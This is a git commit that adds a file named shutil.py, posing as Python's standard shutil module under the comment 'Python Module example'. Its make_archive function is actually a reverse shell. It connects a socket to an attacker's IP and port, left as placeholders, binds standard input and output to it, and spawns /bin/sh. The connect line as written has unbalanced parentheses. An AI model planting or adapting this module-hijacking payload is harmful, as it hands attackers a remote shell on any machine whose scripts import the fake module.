7310c5510b344808626ebea5fa5f857ef21f1603
4an7o <42227817+4an7o@users.noreply.github.com>
2021-07-26 16:57:25 +0800

    Create shutil.py

---
+++ shutil.py
@@ -0,0 +1,7 @@
+# Python Module example
+
+def make_archive(a, b, c):
+  import sys,socket,os,pty;s=socket.socket()
+  s.connect((##Put Your IP, ##Put listening port)))
+  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
+  pty.spawn("/bin/sh")
